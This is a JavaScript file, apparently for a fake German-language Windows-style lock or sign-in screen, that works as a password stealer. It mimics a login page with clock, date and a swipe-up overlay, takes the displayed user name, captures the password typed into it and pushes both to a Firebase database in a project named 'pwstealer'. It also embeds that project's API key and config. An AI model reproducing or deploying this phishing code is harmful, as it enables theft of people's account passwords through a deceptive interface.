var secondWindow;
window.addEventListener('message', function (event) {
	if (event.data) {
		if (event.data == "close") {
			setTimeout(function () {
				window.close();
			}, 1000);
		} else {
			$('.signin h2').html(event.data[0]);
			$('.signin h2 + p').html(event.data[1]);
		}
	}
});
postMessageToOpenerWindow("sendData");


$(document).ready(function () {
	var clicking = false;
	var posY;
	var movingDown;
	var newPosChange;
	$('.overlay').mousedown(function (e) {
		if (e.which != 1) { return false }
		clicking = true;
		movingDown = false;
		newPosChange = 0;
		$('.overlay').removeClass("closed");
		posY = e.pageY;
	});
	$(document).mouseup(function (e) {
		if (e.which != 1) { return false }
		clicking = false;
		if (!movingDown) {
			$('.overlay').addClass("open");
		} else {
			$('.overlay').addClass("closed");
		}
		$('.overlay').css("transform", "");
	})
	$('.overlay').mousemove(function (e) {
		if (clicking == false) return;
		if (e.pageY <= posY) {
			movingDown = e.pageY - posY > newPosChange;
			newPosChange = e.pageY - posY;
			let transform = "translateY(calc(" + newPosChange + "px + -100%))";
			$('.overlay').css("transform", transform);
		} else {
			$('.overlay').css("transform", "translateY(calc(-100%))");
		}
	});
	$(window).keydown(function (e) {
		if (!$('.overlay').hasClass("open") && e.keyCode != 122) {
			$('.overlay').removeClass("closed");
			$('.overlay').addClass("open");
			e.preventDefault();
		}
	});

	setTime();
	//Update time every 10 seconds
	setInterval(function () { setTime() }, 10000);

	function setTime() {
		var currentdate = new Date();

		var actualTime = "<span>" + zeroPad(currentdate.getHours(), 2) + "</span><span>:</span><span>" + zeroPad(currentdate.getMinutes(), 2) + "</span>";
		$('.time').html(actualTime);

		var days = ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"];
		var months = ["Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"]
		var actualDate = days[currentdate.getDay()] + ", " + currentdate.getDate() + ". " + months[currentdate.getMonth()];
		$('.date').html(actualDate);
	}

	function zeroPad(num, places) {
		var zero = places - num.toString().length + 1;
		return Array(+(zero > 0 && zero)).join("0") + num;
	}

	$('.pw').keypress(function (e) {
		if (e.which == 13) {
			writeUserData();
			return false;
		}
	});

	$('.send').click(function (e) {
		e.preventDefault();
		writeUserData();
		return false;
	});
});


// Initialize Firebase
var config = {
	apiKey: "AIzaSyBdLZUKI8Nle_CtztSm2P4CLGy301ghUlc",
	authDomain: "pwstealer-6723b.firebaseapp.com",
	databaseURL: "https://pwstealer-6723b.firebaseio.com",
	storageBucket: "pwstealer-6723b.appspot.com",
};
firebase.initializeApp(config);

//Auth
var uid = null;
firebase.auth().onAuthStateChanged(function (user) {
	if (user) {
		uid = user.uid;
	}
});

firebase.auth().signInAnonymously().catch(function (error) {
	// Handle Errors here.
	var errorCode = error.code;
	var errorMessage = error.message;
	console.log(error.code);
	console.log(error.message);
});

function writeUserData() {
	firebase.database().ref('users/' + uid).push({
		name: $('.signin h2').text(),
		pw: $('.pw').val()
	}, finish);
}

function finish() {
	postMessageToOpenerWindow("finished");
}

function postMessageToOpenerWindow(message) {
	if (window.opener) {
		window.opener.postMessage(message, "*");
	}
}